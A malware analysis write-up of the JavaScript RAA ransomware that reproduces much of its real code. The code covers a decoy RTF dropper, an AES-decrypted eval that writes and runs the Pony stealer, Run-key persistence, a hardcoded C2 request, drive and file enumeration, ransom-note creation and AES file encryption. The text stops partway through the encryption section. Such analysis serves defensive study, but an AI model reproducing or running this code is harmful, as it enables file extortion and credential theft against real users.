## RAA Ransomware JavaScript code analysis

On 14th of June 2016 while checking Twitter I spotted an information about new ransomware called RAA Ransomware. Couple of websites mentioned about it as first ransomware created only by using JavaScript.

Following some links provided by Polish malware analyst **@hasherezade** (https://github.com/hasherezade, https://twitter.com/hasherezade) I've downloaded RAA JavaScript source code from malwr.com (https://malwr.com/analysis/YmE4MDNlMzk2MjY3NDdlYWE1NzFiOTNlYzVhZTlkM2Y/) to take a look at its internals.

# Table of Contents

- [RAA Ransomware JavaScript code analysis](#raa-ransomware-javascript-code-analysis)
	- [What is this writeup about?](#what-is-this-writeup-about)
- [Analysis](#analysis)
	- [Some first thoughts](#some-first-thoughts)
	- [Splitting code into separate parts](#splitting-code-into-separate-parts)
- [How RAA JavaScript works](#how-raa-javascript-works)
	- [Execution flow graph](#execution-flow-graph)
	- [The beginning](#the-beginning)
	- [Here comes the Pony](#here-comes-the-pony)
	- [Modify Windows registry](#modify-windows-registry)
	- [Connect to the server](#connect-to-the-server)
	- [Identify drives, folders and files](#identify-drives-folders-and-files)
	- [Last step - encryption of files](#last-step---encryption-of-files)
	- [End of the process](#end-of-the-process)
- [Summary](#summary)
	- [Get in touch maybe?](#get-in-touch-maybe)
- [Links, references](#links-references)


--

### What is this writeup about?

As this is my very first time I was analyzing malicious code (and its worst type - ransomware) - if you're experienced Reverse Engineer or Malware Analysis - you may feel that a lot of things/details is missing here. Please, forgive me.

This writeup is focused mostly on how JavaScript works in RAA rather than on details of eg. modifying Windows Registry. But as there's a lot of Windows Script Host API used here, I've added reference links for couple of interesting resources, mostly on MSDN pages, if someone will want to dig a little bit more.

File **raa.js** contains original content of RAA downloaded from malwr.com. Other folders and files contains eg. extracted RTF files or parts of RAA code which I've created and executed "on the fly" to find how exactly some parts of the code works.

When I've started to work on this, I've tried to refactor variables and function names to something more meaningful. Unfortunately, this did not help much, so I decided not to do this at all. Original names have the same impact on code readability.


## Analysis

### Some first thoughts

For someone like me, who works with JavaScript for eight to ten hours every day and sleeps with ES6 book under the pillow - RAA source code looks like one, big mess. There are even labels used in code to immediately jump off out of the loop (good old Basic GOTO is the grandpa of this). I'll explain how it works when analyzing one of RAA functions below.

Unfortunately, this messy, spaghetti code just does its job. And no Pokemon to catch here after all...

--

### Splitting code into separate parts

First look at source of RAA (see **raa.js** file) reveals three main part of the code:


```javascript
/*
	CryptoJS library
	lines from 1 to 482
*/

/*
	main ransomware logic
	lines from 485 to 1082
*/


/*
	part where first malicious RTF is created
	lines from 1083 to the end of file
*/

```



RAA contains 3rd party library, used for all encoding and encryption  purposes. It's **CryptoJS** library (source code available here https://code.google.com/archive/p/crypto-js/ or GitHub fork here https://github.com/sytelus/CryptoJS).

Analysis of CryptoJS is not a part of this writeup - as originally this library is not a part of RAA :) 


## How RAA JavaScript works


### Execution flow graph

Next paragraphs describe in details each function of RAA. Here's a very simplified execution flow chart how they all are executed, starting from the very beginning. For now it does not look good. Every function and variable name is just some random string and there's no way to know what does function or variable responsible for.

```javascript
// Execution flow of RAA

	
	YUIMqkFkI()
		|
		|
		v
	nYuMHHRx()
	NWvQtGjjfQX()
		|
		v
	zQqUzoSxLQ() ---> HxBG()
						|
						|
						v
					try {
						uTNMmZ() --------
					} catch {			|
						izzU()			|
					}	  |				|
						  |				|
					      |				v
						  |			NdpcNJVAPrNj()
						  |				|
						  |				v
						  |<-----------izzU()
						  |
						  v
					iKTzQKbfDJs()
					      |
					      v
	 				PLnEyqCPKHV()
					      v
					nXmsNjMpKTv()
				   	do {
						KWgwJwOlqJcs(file_to_encrypt)
					} while (files_to_encrypt)




```

Now, it's time to go through every line of RAA code.

--
### The beginning

First executable line of script is this assigment:

```javascript
var TBucypWw = YUIMqkFkI();
```

**TBucypWw** is the variable which contains key generated by **YUIMqkFkI()** function - it is used in other parts of the code.

Let's take a look at **YUIMqkFkI()** logic:

```javascript
function YUIMqkFkI() {
    var TBucypWw = "";
    var WKQttPJDfsQE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < 5; i++)
        TBucypWw += WKQttPJDfsQE.charAt(Math.floor(Math.random() * WKQttPJDfsQE.length));
    return TBucypWw;
}
```

This fragment just generates a string which contains five characters randomly chosen from **WKQttPJDfsQE** string. In this writeup, to understand its meaning, how and where it's used, I assigned _**xW5Gf**_ as generated value of **TBucypWw** variable.

--

### Here comes the Pony.

Next executable fragment is this part:

```javascript
var Yvwtdbvd = WScript.Arguments;
if (Yvwtdbvd.length == 0) {
    nYuMHHRx();
    NWvQtGjjfQX();
} else {
    null;
}
```


And this is the place here's RAA starts its work. After script checks if there are any arguments passed (let's assume that there aren't any) **nYuMHHRx()** is executed (I've truncated content of **tpcVJWrQG** here): 


```javascript
function nYuMHHRx() {
    var tpcVJWrQG = "e1xy(...)OBBSDIO==";
    tpcVJWrQG = tpcVJWrQG.replace(/BBSDIO/g, "A");
    var clear_tpcVJWrQG = CryptoJS.enc.Base64.parse(tpcVJWrQG);
    var CLWSNdGnlGf = clear_tpcVJWrQG.toString(CryptoJS.enc.Utf8);
    CLWSNdGnlGf = CLWSNdGnlGf.replace(/BBSDIO/g, "A");
    var RRUm = new ActiveXObject('ADODB.Stream');
    var GtDEcTuuN = WScript.CreateObject("WScript.shell");
    var TkTuwCGFLuv_save = GtDEcTuuN.SpecialFolders("MyDocuments");
    TkTuwCGFLuv_save = TkTuwCGFLuv_save + "\\" + "doc_attached_" + TBucypWw;
    RRUm.Type = 2;
    RRUm.Charset = "437";
    RRUm.Open();
    RRUm.WriteText(CLWSNdGnlGf);
    RRUm.SaveToFile(TkTuwCGFLuv_save);
    RRUm.Close();
    var run = "wordpad.exe " + "\"" + TkTuwCGFLuv_save + "\"";
    GtDEcTuuN.Run(run);
    return 0;
}
```

Let's go through it step by step.

**tpcVJWrQG** contains very long Base64 encoded string. After a couple of operations with Regular Expressions and CryptoJS methods calls - finally we get RTF document (see **extracted/extracted_rtf.rtf** file)

Then, those two lines use Windows Script Host methods to create some objects, one for creating file, second for creating an instance of executable shell:

```javascript
var RRUm = new ActiveXObject('ADODB.Stream');
var GtDEcTuuN = WScript.CreateObject("WScript.shell");
```

This line:

```javascript
RRUm.Charset = "437";
```

allows JavaScript and _ADODB.Stream_ object to treat any binary data as string.
This definition is used across all RAA codebase many times.

Next, a file is created with following path:

```
\MyDocuments\doc_atatched_xW5Gf
```

Content of previously generated RTF file is then saved at this path.

Finally, following command is prepared:

```
var run = wordpad.exe "\MyDocuments\doc_atatched_xW5Gf"
```

and executed by Windows Script Host using method Run():

```
GtDEcTuuN.Run(run);
```
( reference: https://msdn.microsoft.com/en-us/library/d5fk67ky(v=vs.84).aspx )

As a result, RTF document is displayed with some error message:

![RTF document](extracted/extracted_rtf_screen.png)


Next function is **NWvQtGjjfQX()** (I've truncated content of **data_pn** here): 


```javascript
function NWvQtGjjfQX() {
    var data_pn = "TVrDiQNMSFE(...)QQURE";

    var cmd = "U2FsdGVkX1/LHQl+aIAo/hXHDEI5YmZZtBIcL5LHq7o+NZyTxtiLAxCsucmN0NBq12nnNJ7XOCyeXqF9xLAkahyIcXx5oc/ic5FRpoj+tZ1qywTZNhPWMlRllGn8O8viVnpXMYHoJr/AphGHfaAOkX8xYjuWhZE8qw1Qw1vQbqdbMlv5RL3xTETBgbylCgyGER91Kef4Q/2YtokOqzg+0BZIjKpdIbr1jQdh8uwp9MKd+Y9dSm1Lz9dl82QJVVbFiBj7N6MEDCw5JESVi5HilHWFEb3eyacdJBxYtKutbAZBOl6aJrLyxKtlxm4o9Cie5+vIPgMtqHEmBWp9GaqYDQlxXXOuTeysry1LXQiCGP7msk2hqAOEhyfxchlAQuma4twTFqHOrPZDECk8hfVJkBvUZg/hl+y4gKbBBLVDEIlKW9AstpcAP6FOcTt/bsS+0fvHnl1fAtMB1AsBSHKhZX/6eMPBGQBQT5fqvyy8MLyMgLOsCt5XHyEgc2ecU1fDokpzzMxMqIPwFZoQDOZSg/pBOMVTyUHuv18WdWI+Q6lppzIUv4mvxEioH7SROiDFqJoHR4EwIdDO0QR82Q4RTTIWO9CfXkC5VnXlEncsU45rIzfEMDv4r1aqoYQlgFr6xjas0/e7+EVCoxhsp4C2Jta43NmC6uLnhjcWRdCcB/8=";
    var key_cmd = "2c025c0a1a45d1f18df9ca3514babdbc";
    var dec_cmd = CryptoJS.AES.decrypt(cmd, key_cmd);
    dec_cmd = CryptoJS.enc.Utf8.stringify(dec_cmd);
    eval(dec_cmd);
    return 0;
}
```

This function executes code with _eval()_ call...

```javascript
	eval(dec_cmd);
```

...which comes from decrypted **cmd** (with **key_cmd** key):

```javascript
	var key_cmd = "2c025c0a1a45d1f18df9ca3514babdbc";
    var dec_cmd = CryptoJS.AES.decrypt(cmd, key_cmd);
    dec_cmd = CryptoJS.enc.Utf8.stringify(dec_cmd); 
```


This code contains following instructions:

```javascript
var flo = new ActiveXObject ("ADODB.Stream");
var runer = WScript.CreateObject("WScript.Shell");
var wher = runer.SpecialFolders("MyDocuments");
wher = wher + "\\" + "st.exe";
flo.CharSet = "437";
flo.Open();
var pny = data_pn.replace(/NMSIOP/g, "A");
var pny_ar = CryptoJS.enc.Base64.parse(pny);
var pny_dec = pny_ar.toString(CryptoJS.enc.Utf8);
flo.Position = 0;
flo.SetEOS;
flo.WriteText(pny_dec);
flo.SaveToFile(wher, 2);
flo.Close;
wher = "\"" + wher + "\"";
runer.Run(wher);
```

Again, new ActiveXObject is created, named **flo**, and Windows Script Host Shell to execute file called **st.exe**:

Then, **data_pn** from **NWvQtGjjfQX()** is decrypted and new file is created "on the fly":

```javascript
var pny = data_pn.replace(/NMSIOP/g, "A");
var pny_ar = CryptoJS.enc.Base64.parse(pny);
var pny_dec = pny_ar.toString(CryptoJS.enc.Utf8);
```
I saved this file in extracted/ folder as **file01**. As I found here - https://reaqta.com/2016/06/raa-ransomware-delivering-pony/ - it contains malware called Pony (http://www.mcafee.com/threat-intelligence/malware/default.aspx?id=105468). After I found this information I've realized that its code comes from variable called **pny** (PoNY) Nice naming convention... :)

Next, Pony is saved to file with previously created ADODB.Stream ActiveX object and executed.
You can find more information about Pony here: https://blog.malwarebytes.com/threat-analysis/2015/11/no-money-but-pony-from-a-mail-to-a-trojan-horse/

--

### Modify Windows registry

Next function sets entry in Windows HKCU\Software\Microsoft\Windows\\CurrentVersion\Run\ registry key.

It uses _WScript.Shell_ object from Windows Script Host. It allows to read Windows registry entries (with _RegRead_ method - see https://msdn.microsoft.com/en-us/library/x05fawxd(v=vs.84).aspx).

```javascript
function zQqUzoSxLQ() {
    var QCY;
    var kHkyz = WScript.CreateObject("WScript.Shell");
    try {
        kHkyz.RegRead("HKCU\\RAA\\Raa-fnl\\");
    } catch (e) {
        QCY = 0;
    }
    var lCMTwJKZ = [];
    var baZk = "wscript.exe";
    var AFtKLHIjDtkM = 0;
    var e = new Enumerator(GetObject("winmgmts:").InstancesOf("Win32_process"));
    for (; !e.atEnd(); e.moveNext()) {
        var p = e.item();
        lCMTwJKZ = lCMTwJKZ + p.Name + ",";
    }
    lCMTwJKZ = lCMTwJKZ.split(",");
    var jcayrm = -1;
    do {
        jcayrm += 1;
        if (lCMTwJKZ[jcayrm] == baZk) {
            AFtKLHIjDtkM = AFtKLHIjDtkM + 1;
        } else {
            null
        }
    } while (jcayrm < lCMTwJKZ.length);
    if (AFtKLHIjDtkM < 2 && QCY == 0) {
        var TKVUdGUkzCmE = WScript.ScriptFullName;
        TKVUdGUkzCmE = TKVUdGUkzCmE + " argument";
        var qPOGRFfINeNb = WScript.CreateObject("WScript.Shell");
        qPOGRFfINeNb.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", TKVUdGUkzCmE, "REG_SZ");
        HxBG();
    } else {
        null;
    }
    return 0;
}
```

At the beginning, code checks if there's an entry in Windows registry at _HKCU\RAA\Raa-fnl_ path. If not, **QCY** variable is set to 0.

Next couple of lines check list of run processes:

```javascript
// e is an iterator which allows to enumerate running processes
var e = new Enumerator(GetObject("winmgmts:").InstancesOf("Win32_process"));
```

Last part of the function checks if there are currently running **wscript.exe** processes and, under some conditions (eg. if previous _check_ is equal to 0) adds new Registry value under _HKCU\Software\Microsoft\Windows\CurrentVersion\Run\\_ key, then **HxBG()** function is run.

--

### Connect to the server

Last part of RAA code contains two very long functions, **HxBG()** and **izzU()**

First, let's take a look at **izzU()**. 

It starts from generating GUID, from within string contains 36 chars is cut and assigned to **cVjZujcP**. This value is used later.

```
Globally Unique Identifier or GUID is a 128-bit integer (16 bytes) 
that is used by some software applications across all computers and 
networks in order to provide a reference number which is unique or 
to identify a particular component. Because of this there's a very 
low probability that any two or more component has the same value.

GUID is also used in Windows Registry.

More info:
https://msdn.microsoft.com/en-us/library/windows/desktop/aa373931(v=vs.85).aspx

```

Here's the code which generates GUID:

```javascript
 var FknDierotSzK = new ActiveXObject("Scriptlet.TypeLib");
 var cVjZujcP = FknDierotSzK.GUID.substr(1, 36);
```

Next thing is to initialize **KrvABjTTXNS** array with values read from remote server. Function **get_HZtSmFNRdJM()**, which is responsible for this part, contains hardcoded url, with **id** argument passed via GET:

```javascript
var VuSD = cVjZujcP + " - RAA";
var MOSKn = [];
MOSKn[0] = "http://startwavenow.com/cmh" + "/mars.php?id=" + VuSD;
```

Server IP address (188.40.248.65) is a part of a network located in Germany (?), owned by Romanian hosting company THC Projects. Those information were valid on 14.07.2016, when this part of my writeup was created.


```

% Abuse contact for '188.40.248.64 - 188.40.248.95' is 'abuse@hetzner.de'

inetnum:        188.40.248.64 - 188.40.248.95
netname:        HOS-131355
descr:          HOS-131355
country:        DE
admin-c:        STPS1-RIPE
tech-c:         STPS1-RIPE
status:         ASSIGNED PA
mnt-by:         HOS-GUN
created:        2015-07-21T01:16:26Z
last-modified:  2015-07-21T01:16:26Z
source:         RIPE # Filtered

person:         SC THC Projects SRL
address:        str complexului 3
address:        207206 Carcea
address:        ROMANIA
phone:          +40743216666
nic-hdl:        STPS1-RIPE
remarks:        For abuse contact abuse@thcservers.com or visit https://www.thcservers.com
abuse-mailbox:  abuse@thcservers.com
mnt-by:         HOS-GUN
created:        2014-11-30T13:42:54Z
last-modified:  2014-11-30T13:42:54Z
source:         RIPE # Filtered
```


I could not check what server returns, because this particular account was suspended. In next line, _ServerXMLHTTP_ object is created to communicate with remote machine. Next couple of lines set timeouts for **req** object (see https://msdn.microsoft.com/en-us/library/ms760403(v=vs.85).aspx for details):

```javascript
var req = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
var QSJCTxMMl = 15000;
var bFPwcaPNy = 15000;
var zarI = 15000;
var olWVonsDzH = 15000;
req.setTimeouts(QSJCTxMMl, bFPwcaPNy, zarI, olWVonsDzH);
```

Following code uses Ajax HTTP GET call to receive some data from remote machine:

```javascript
(...)
var MOSKn = [];
MOSKn[0] = "http://startwavenow.com/cmh" + "/mars.php?id=" + VuSD;
(...)
var pointer_MOSKn = -1;
var aka;
do {
    pointer_MOSKn += 1;
    if (pointer_MOSKn <= 0) {
        pointer_MOSKn = pointer_MOSKn;
    } else {
        pointer_MOSKn = 0;
        WScript.Sleep(60000);
    }
    try {
        req.open("GET", MOSKn[pointer_MOSKn], false);
        req.send();
        aka = req.responseText.split(',');
    } catch (e) {
        aka = 0;
    }
} while (aka == 0);
return aka;
```

If we take a look at this fragment a little bit closer, it does not have a lot of sense. Take a look at how **MOSKn** array is used - only its first element is initalized and then, inside _do...while()_ loop, only 0 index is in use (if we follow  **pointer_MOSKn**, its value is always 0).

Because **aka** value changes after first request, I couldn't check what exactly is returned as startwavenow.com domain was already suspended and url does not respond, but I found an information in ReaQta writeup that there were some values used in encryption phase later - see https://reaqta.com/2016/06/raa-ransomware-delivering-pony/ for more details. 

After **get_HZtSmFNRdJM()** function there's code assigns returned values to an array:

```javascript
var KrvABjTTXNS = [];
KrvABjTTXNS = get_HZtSmFNRdJM();
var VKw = KrvABjTTXNS[0];
var jOnaTnksWb = KrvABjTTXNS[1];
```

--

### Identify drives, folders and files

Next executable fragment of the code contains another array initialization and assignment result of **kth()** function to its first element:

```javascript
var kAgTDYi = [];
kAgTDYi[0] = kth();
```

So let's see now what is going on inside **kth()**:


```javascript
function kth() {
    var DmYbWSaT, s, n, e, sNaZfrOWc;
    DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
    e = new Enumerator(DmYbWSaT.Drives);
    s = [];
    RKsqOBz:   for (; !e.atEnd(); e.moveNext()) {
        sNaZfrOWc = e.item();
        if (sNaZfrOWc.IsReady) {
            sNaZfrOWc = sNaZfrOWc += "\\\\";
            s.push(sNaZfrOWc);
        } else
            continue RKsqOBz;
    }
    return (s);
}

```

This is the first function where I found real example of how labels can be used to immediately escape from _for_ loop. ```continue RKsqOBz;``` instruction causes JavaScript interpreter to immediately jump off the loop, right to ```RKsqOBz:``` label definition.

This language construct is equivalent to other languages _goto_ instruction. It's not a good habit to use such instructions as it's hard to follow execution flow of the program and is very error prone. And, if the code is well organized, it's absolutely unnecessary to use any _goto_-like construct. But I am pretty sure that those arguments aren't accurate for RAA.
    
You can read more about how to use labels in JavaScript here: http://devdocs.io/javascript/statements/label

Ok, go back to our function.

At the beginning there's _FileSystemObject_ created. As we can find on MSDN documentation page:

```
Main object. Contains methods and properties that allow you to 
create, delete, gain information about, and generally manipulate 
drives, folders, and files. Many of the methods associated with this 
object duplicate those in other FSO objects; they are provided for 
convenience.
```
(https://msdn.microsoft.com/en-us/library/95dtkhsz(v=vs.84).aspx)

Then, _Enumerator_ property is instantiated and standard method to detect all drives is used (you can follow similar example on https://msdn.microsoft.com/en-us/library/832c8c0x(v=vs.84).aspx)
Finally, array contains all drives letters is returned.


Next fragment which is executed is:

```javascript
iKTzQKbfDJs();
kAgTDYi[1] = [];
```


Function **iKTzQKbfDJs()** calls two other functions, **OFTEml()** and **YlDrqb()** - let's follow both of them to get the final result of their execution:

```javascript
function iKTzQKbfDJs() {
    var mItZKEXYwE = [];
    mItZKEXYwE = kAgTDYi[0];
    mItZKEXYwE = OFTEml(mItZKEXYwE);
    var rjTvWjMKnGpI = -1;
    do {
        rjTvWjMKnGpI += 1;
        YlDrqb(mItZKEXYwE[rjTvWjMKnGpI]);
    } while (rjTvWjMKnGpI < mItZKEXYwE.length - 1);
    return 0
}
```

First, **mItZKEXYwE** array is created and its value is simply the first element of **kAgTDYi**, which is previously returned list of drives from **kth()** .
This array contains drives letters is passed as an argument to function **OFTEml()**:


```javascript
function OFTEml(array_to_clean) {
    var pjvsEz = new Array();
    for (var i = 0; i < array_to_clean.length; i++) {
        if (array_to_clean[i]) {
            pjvsEz.push(array_to_clean[i]);
        }
    }
    return pjvsEz;
}

```

This short function returns all not empty (eg. strings like "") elements from array passed as argument.

Next function **YlDrqb()**, is called for every element of cleaned by **OFTEml()** array (in other words: is executed for each drive)

```javascript
function YlDrqb(kth) {
    var gg = new ActiveXObject("Scripting.FileSystemObject");
    var dir = kth + "!!!README!!!" + TBucypWw + ".rtf";
    var d2 = gg.CreateTextFile(dir, true);
    d2.Write(VGCDtihB());
    d2.Close();
    return 0;
}
```
Again, _FileSystemObject_ is used to create file with following example name on each drive, and it writes to those files content created by function **VGCDtihB()**:

```
C!!!README!!!xW5Gf.rtf
```

Why **xW5Gf** in filename? Remember function which generates random key, from the very beginning of RAA execution? Here's where this key is used (see 'The beginning' above).

Function **VGCDtihB()** generates another _rtf_ file with ransomware payment note - you can see this file on ReaQta writeup (https://reaqta.com/wp-content/uploads/2016/06/RAA_Ransomware_build_refund_file.png - as I was not able to generate those files on my machine)


```javascript

function VGCDtihB() {
    var rftKZajp = "e1xydG(...)QoRAASEP";
    var cUNSPAqZAE = rftKZajp.replace(/RAASEP/g, "A");
    cUNSPAqZAE = CryptoJS.enc.Base64.parse(cUNSPAqZAE);
    cUNSPAqZAE = cUNSPAqZAE.toString(CryptoJS.enc.Utf8);
    cUNSPAqZAE = cUNSPAqZAE.replace(/=IDHERE=/g, cVjZujcP);
    cUNSPAqZAE = cUNSPAqZAE.replace(/=ADRHERE=/g, jOnaTnksWb);
    return cUNSPAqZAE;
}
``` 

As you can see, it uses similar method as for first _rtf_ file: some simple Base64 string manipulation with couple of replace() function with Regular Expression calls.


Next, there is **PLnEyqCPKHV()** function call, which is the main loop encrypting each file through **KWgwJwOlqJcs()** function described later:

```javascript
function PLnEyqCPKHV() {
    var sNaZfrOWc = nXmsNjMpKTv(kAgTDYi);
    var NBMCuybDY = -1;
    iFIS:do {
        NBMCuybDY += 1;
        try {
            KWgwJwOlqJcs(sNaZfrOWc[NBMCuybDY]);
        } catch (e) {
            continue iFIS;
        }
    } while (NBMCuybDY <= sNaZfrOWc.length - 2);
    return 0
}

PLnEyqCPKHV();
```

**sNaZfrOWc** array is initialized by **nXmsNjMpKTv()** function, with our previously generated list of drives **kAgTDYi** from **kth()** function:

```javascript
function nXmsNjMpKTv(kAgTDYi) {
    var EPtLPm = -1;
    var wVgUUZeM = -1;
    do {
        EPtLPm += 1;
        var LeDOaP = LMz(kAgTDYi[0][EPtLPm]);
        var LeDOaP = LeDOaP.split(TBucypWw);
        kAgTDYi[1] = kAgTDYi[1].concat(LeDOaP);
        kAgTDYi[1] = OFTEml(kAgTDYi[1]);
        var aZKH = HHiAp(kAgTDYi[0][EPtLPm]);
        var aZKH = aZKH.split(TBucypWw);
        kAgTDYi[0] = kAgTDYi[0].concat(aZKH);
        kAgTDYi[0] = OFTEml(kAgTDYi[0]);
    } while (EPtLPm <= kAgTDYi[0].length - 2);
    return (kAgTDYi[1]);
}

```

In function above, there's interesting way how to define counter for _do...while_ loop. **EPtLPm** starts not from 0 or 1, but from -1. In loop condition, value of **EPtLPm** is compared with length of **kAgTDYi** array minus 2. I suppose this is some kind of obfuscation _do...while_ loop, but I am only guessing here.

**LMz()** function is executed for every drive (drives are stored in element of index 0 and this element is also an array - that is why 
**kAgTDYi[0][EPtLPm]** is used)

**LMz()** contains a lot of _if..else if_ conditions. The only purpose of this function is to iterate over all files on drive and create one, long string with filenames of particular types (images, MS Office documents, PDF files, Zip archives, Photoshop files - do you see variables initialized by strings containing some popular files extensions in function body?). Those filenames are concatenated together with **TBucypWw** key as separator, which is then used to split this string into array in the next line in **nXmsNjMpKTv()**.

Extensions such as _.locked_ are omitted.

Next, as new element of **kAgTDYi** a new array is build from all previously generated arrays with filenames (in other words: _concat()_ joins array with filenames extracted from actual drive with current value of **kAgTDYi[1]**).

Next, quick cleanup is performed on those list - all empty entries are removed:

```javascript
function OFTEml(array_to_clean) {
    var pjvsEz = new Array();
    for (var i = 0; i < array_to_clean.length; i++) {
        if (array_to_clean[i]) {
            pjvsEz.push(array_to_clean[i]);
        }
    }
    return pjvsEz;
}
```

Function **HHiAp()** performs similar operation like **LMz()**, but with folder names rather than files. It creates and returns a list of all folders on each drive, which names are not in defined set. In other way - encryption does not include system folders like _WINDOWS_, _RECYCLER_, _Program Files_, _Temp_, _AppData_ and similar.

Finally, **nXmsNjMpKTv()** returns an array contains all filenames from each drive of an infected machine.


--

### Last step - encryption of files

Function **KWgwJwOlqJcs()** finishes whole process. This function is called in the loop in **PLnEyqCPKHV()** (one iteration per each file) with file name passed as an argument.

**KWgwJwOlqJcs()** contains a couple of private scoped functions with the one responsible for encryption:

```javascript
function ukBnxEOtjm(EQs) {
    var HZtSmFNRdJM = HZtSmFNRdJM_data[1];
    var gmCRXSMsLyM = qPCIyff[1];
    EQs = CryptoJS.AES.encrypt(EQs, HZtSmFNRdJM, {gmCRXSMsLyM: gmCRXSMsLyM});
    return EQs;
}
```

To this function goes every single file which RAA wants to encrypt.

But before any file goes through those four lines, a lot of other things is happening. Let's go through them step by step.

First, two variables are initialized with values returned from **rStinsVp()** function:

```javascript
var HZtSmFNRdJM_data = rStinsVp(VKw);
var qPCIyff = rStinsVp(VKw);
```

**rStinsVp()** function takes one argument, **VKw**, which is one of two values returned from remote server (see 'Connect to the server
' part of this writeup with **get_HZtSmFNRdJM()** function description above).


```javascript
function rStinsVp(rand) {
    var eqQu = [];
    var EPtLPmand = -1;
    do {
        EPtLPmand += 1;
        eqQu[EPtLPmand] = Math.floor((Math.random() * 2000) + 1);
        if (eqQu[EPtLPmand] < 10) {
            eqQu[EPtLPmand] = "000" + eqQu[EPtLPmand];
        } else if (eqQu[EPtLPmand] >= 10 && eqQu[EPtLPmand] < 100) {
            eqQu[EPtLPmand] = "00" + eqQu[EPtLPmand];
        } else if (eqQu[EPtLPmand] >= 100 && eqQu[EPtLPmand] < 1000) {
            eqQu[EPtLPmand] = "0" + eqQu[EPtLPmand];
        } else {
            eqQu[EPtLPmand] = eqQu[EPtLPmand];
        }
    } while (eqQu.length < 32);
    var xjLCtcIO = "";
    var EPtLPmand2 = -1;
    var vPdyagHuFMMj = [];
    do {
        EPtLPmand2 += 1;
        vPdyagHuFMMj[EPtLPmand2] = parseInt(eqQu[EPtLPmand2]);
        xjLCtcIO = xjLCtcIO + rand.charAt(vPdyagHuFMMj[EPtLPmand2]);
    } while (xjLCtcIO.length < 32);
    var gieJISwveNlD = [];
    gieJISwveNlD[0] = eqQu;
    gieJISwveNlD[1] = xjLCtcIO;
    return gieJISwveNlD;
}
```

Logic of this function is quite simple: it returns an array with two elements: first is another array with 32 4-digits numbers and second one is 32 characters length string.

I ran this function and as argument I've passed some random MD5 hash. Results were similar for any other strings as well:

```javascript
// rStinsVp.js file content
console.log(rStinsVp("c2378574f4fa4a4353d1ab7e2961fd88"));
```

```
$ node rStinsVp.js
[ [ '0981',
    '0829',
    '0272',
    '0715',
    '0045',
    '0193',
    '0881',
    1361,
    1517,
    '0957',
    '0546',
    '0621',
    '0932',
    1659,
    1102,
    1861,
    '0339',
    1688,
    '0941',
    '0756',
    1727,
    '0257',
    '0565',
    1963,
    '0912',
    '0333',
    '0269',
    1095,
    1191,
    1962,
    '0514',
    '0939' ],
  'cccccccccccccccccccccccccccccccc' ]
```
In real execution **HZtSmFNRdJM_data** and **qPCIyff** should contains some similar results as above. As I mentioned earlier - I can't check this as there's no way to get real values from remote server.


Next call is **udpIHxNm()** function, which takes as an argument name of the file to encrypt (from list of files generated in function **nXmsNjMpKTv()**; each file is passed here through _do..while_ loop in **PLnEyqCPKHV()** to the function **KWgwJwOlqJcs()** called per each file name).


```javascript
function udpIHxNm(IMhTname) {
    var SlSPWu = WScript.CreateObject("ADODB.Stream");
    SlSPWu.CharSet = '437';
    SlSPWu.Open();
    SlSPWu.LoadFromFile(IMhTname);
    var hXpHGpZ = [];
    hXpHGpZ[0] = [];
    hXpHGpZ[1] = [];
    var PRuJZyAvfeza = SlSPWu.Size;
    if (PRuJZyAvfeza > 6122 && PRuJZyAvfeza < 5000000) {
        var GinRqOjln = OQlYdejWlC(2000, 2040);
        hXpHGpZ[0][0] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
        var kWsAN = Math.floor(PRuJZyAvfeza / 2) - 3060;
        hXpHGpZ[1][0] = SlSPWu.ReadText(kWsAN) + "RAA-SEP";
        hXpHGpZ[0][1] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
        var iPZDBPG = PRuJZyAvfeza - (SlSPWu.Position + GinRqOjln);
        hXpHGpZ[1][1] = SlSPWu.ReadText(iPZDBPG) + "RAA-SEP";
        hXpHGpZ[0][2] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
        SlSPWu.Close;
        jMvqmKSQu(hXpHGpZ);
    } else if (PRuJZyAvfeza > 5000000 && PRuJZyAvfeza <= 500000000) {
        qqJ(IMhTname)
    } else if (PRuJZyAvfeza <= 6122) {
        hXpHGpZ[0][0] = SlSPWu.ReadText;
        SlSPWu.Close;
        jMvqmKSQu(hXpHGpZ);
    } else {
        hXpHGpZ = 0;
        SlSPWu.Close;
        jMvqmKSQu(hXpHGpZ);
    }
    return 0;
}

udpIHxNm(IMhTname);
```

Again, let's analyze this code line by line, because some interesting things are going on here.

First, Windows Script object to manipulate file is initialized and file is loaded and its size is checked:

```javascript
var SlSPWu = WScript.CreateObject("ADODB.Stream");
SlSPWu.CharSet = '437';
SlSPWu.Open();
SlSPWu.LoadFromFile(IMhTname);
var hXpHGpZ = [];
hXpHGpZ[0] = [];
hXpHGpZ[1] = [];
var PRuJZyAvfeza = SlSPWu.Size;

```

Based on file size, different next step is being performed:

```javascript
if (PRuJZyAvfeza > 6122 && PRuJZyAvfeza < 5000000) {
    var GinRqOjln = OQlYdejWlC(2000, 2040);
    hXpHGpZ[0][0] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
    var kWsAN = Math.floor(PRuJZyAvfeza / 2) - 3060;
    hXpHGpZ[1][0] = SlSPWu.ReadText(kWsAN) + "RAA-SEP";
    hXpHGpZ[0][1] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
    var iPZDBPG = PRuJZyAvfeza - (SlSPWu.Position + GinRqOjln);
    hXpHGpZ[1][1] = SlSPWu.ReadText(iPZDBPG) + "RAA-SEP";
    hXpHGpZ[0][2] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
    SlSPWu.Close;
    jMvqmKSQu(hXpHGpZ);
} else if (PRuJZyAvfeza > 5000000 && PRuJZyAvfeza <= 500000000) {
    qqJ(IMhTname)
} else if (PRuJZyAvfeza <= 6122) {
    hXpHGpZ[0][0] = SlSPWu.ReadText;
    SlSPWu.Close;
    jMvqmKSQu(hXpHGpZ);
} else {
    hXpHGpZ = 0;
    SlSPWu.Close;
    jMvqmKSQu(hXpHGpZ);
}
```
* if file size is between 6122 bytes and 4,76 MB (exactly 4882 kB) - then **hXpHGpZ** array is created, and some random values with "RAA-SEP" string appended to them are stored in this array. Next, this array is passed as an argument to **jMvqmKSQu()** function.

